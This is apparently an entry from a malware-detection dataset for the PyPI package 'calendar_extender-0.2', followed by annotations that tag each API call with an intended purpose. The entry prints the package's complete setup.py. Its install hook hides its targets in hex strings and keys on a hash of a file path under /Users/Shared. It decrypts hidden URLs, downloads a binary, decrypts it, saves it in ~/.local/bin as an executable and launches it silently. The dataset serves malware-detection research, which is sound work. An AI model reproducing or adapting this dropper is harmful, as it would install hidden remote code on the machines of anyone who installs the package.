{
  "metadata": {
    "package_name": "calendar_extender-0.2",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/calendar_extender-0.2.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/calendar_extender-0.2.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import subprocess\nimport platform\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom setuptools.command.install import install\n\nICON = [\n\tbytes.fromhex(\n\t\t\"8dcf1b5c290b7463c9ab9044a285c652e5479b24344e7fb827dae8407e077528\"\n\t),\n\tbytes.fromhex(\n\t\t\"b526e970df3039acfaece7c6f6b97ebc652a97450ad389d924a2a5d74ad0edbe0e1e4bf6245a94abd03f8351d1c7fb47d47c0fe065d107a2d05dac00317048c236a94f4fab665669b8\"\n\t),\n\tbytes.fromhex(\n\t\t\"6562d84bb8c9c32b89488b8f13fd4d28640b896298e06a81afd3f5e25654a14e0bb11b327feb5428791bcee129a97c432b0060cffc60e34890ccc747dc99cf75654ce49e3951ff4ebc\"\n\t),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f536861726564\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\"6372616674\"),\n\tbytes.fromhex(\"726962626f6e\"),\n\tbytes.fromhex(\"656666656374\"),\n\tbytes.fromhex(\"6a61636b6574\"),\n]\n\ndef gen(v: bytes, /):\n    def iter(v: bytes, /):\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n        yield b\n\ndef CustomRun(path: bytes, /) -> None:\n    run1 = gen(ICON[5] + path)\n    run2 = gen(ICON[6] + path)\n    run3 = gen(ICON[7] + path)\n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    item1 = ''.join(chr(b ^ k) for b, k in zip(ICON[1], run2))\n    item2 = ''.join(chr(b ^ k) for b, k in zip(ICON[2], run3))\n    url = {\n        \"x86_64\": item1,\n        \"arm64\": item2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out = []\n    for b, k in zip(buf, run1):\n        out.append(b ^ k)\n    binary_path = os.path.join(local_bin_path, 'calendar_extender')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)\n    with open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in ICON[3].glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n            to_hash = ICON[4]  + path_bytes\n            stream = gen(to_hash)\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n            if first_n_bytes == ICON[0]:\n                CustomRun(path_bytes)\n                break",
          "triple_sequences": [
            {
              "action_api": "bytes.fromhex()",
              "action_description": "Creates bytes object from hexadecimal string",
              "action_id": "create_bytes_hex",
              "object": "\"8dcf1b5c290b7463c9ab9044a285c652e5479b24344e7fb827dae8407e077528\"",
              "object_description": "Hexadecimal string",
              "object_id": "create_bytes_hex",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "bytes.fromhex()",
              "action_description": "Creates bytes object from hexadecimal string",
              "action_id": "create_bytes_hex",
              "object": "\"b526e970df3039acfaece7c6f6b97ebc652a97450ad389d924a2a5d74ad0edbe0e1e4bf6245a94abd03f8351d1c7fb47d47c0fe065d107a2d05dac00317048c236a94f4fab665669b8\"",
              "object_description": "Hexadecimal string",
              "object_id": "create_bytes_hex",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "bytes.fromhex()",
              "action_description": "Creates bytes object from hexadecimal string",
              "action_id": "create_bytes_hex",
              "object": "\"6562d84bb8c9c32b89488b8f13fd4d28640b896298e06a81afd3f5e25654a14e0bb11b327feb5428791bcee129a97c432b0060cffc60e34890ccc747dc99cf75654ce49e3951ff4ebc\"",
              "object_description": "Hexadecimal string",
              "object_id": "create_bytes_hex",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "bytes.fromhex()",
              "action_description": "Creates bytes object from hexadecimal string",
              "action_id": "create_bytes_hex",
              "object": "\"2f55736572732f536861726564\"",
              "object_description": "Hexadecimal string",
              "object_id": "create_bytes_hex",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "Path().glob()",
              "action_description": "Directory tree generation",
              "action_id": "path_special_operations",
              "object": "\"C*/*r*/2*/*\"",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "str(path)",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "hashlib.sha3_512()",
              "action_description": "Creates SHA-3 512 hash object",
              "action_id": "create_sha3_512_hash",
              "object": "v",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "os.path.expanduser()",
              "action_description": "Home directory expansion",
              "action_id": "path_special_operations",
              "object": "'~/.local/bin'",
              "object_description": "Home directory path",
              "object_id": "home_directory_path",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.makedirs()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "local_bin_path, exist_ok=True",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "chr()",
              "action_description": "Convert integers to characters",
              "action_id": "convert_integers_to_chars",
              "object": "b ^ k for b, k in zip(ICON[1], run2)",
              "object_description": "XOR result of obfuscated byte and key",
              "object_id": "xor_obfuscated_result",
              "intention_description": "Join characters into string",
              "intention_id": "join_characters_into_string"
            },
            {
              "action_api": "chr()",
              "action_description": "Convert integers to characters",
              "action_id": "convert_integers_to_chars",
              "object": "b ^ k for b, k in zip(ICON[2], run3)",
              "object_description": "XOR result of obfuscated byte and key",
              "object_id": "xor_obfuscated_result",
              "intention_description": "Join characters into string",
              "intention_id": "join_characters_into_string"
            },
            {
              "action_api": "platform.machine()",
              "action_description": "Retrieves machine type",
              "action_id": "get_machine_type",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP GET request to URL",
              "action_id": "open_url_get",
              "object": "url",
              "object_description": "URL string",
              "object_id": "url_string",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "response.content",
              "action_description": "Process HTTP response content",
              "action_id": "process_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "b ^ k for b, k in zip(buf, run1)",
              "action_description": "Prepare character for XOR operation",
              "action_id": "prepare_character_xor",
              "object": "buf, run1",
              "object_description": "Obfuscated string and compressed data",
              "object_id": "obfuscated_compressed_data",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "os.path.join()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "local_bin_path, 'calendar_extender'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Construct file or directory path",
              "intention_id": "construct_file_path"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "binary_path, 'wb'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Open file for writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "bytes(out)",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.chmod()",
              "action_description": "Changes file mode to add execute permission",
              "action_id": "change_file_mode_execute",
              "object": "binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP",
              "object_description": "File permission settings",
              "object_id": "file_permission",
              "intention_description": "Modify file attributes",
              "intention_id": "modify_file_attributes"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "'/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w'",
              "object_description": "Marker file",
              "object_id": "marker_file",
              "intention_description": "Create marker file",
              "intention_id": "create_marker_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command without shell access",
              "action_id": "spawn_process_no_shell",
              "object": "[binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT",
              "object_description": "Unsigned executable",
              "object_id": "unsigned_executable",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            }
          ]
        }
      ]
    }
  ]
}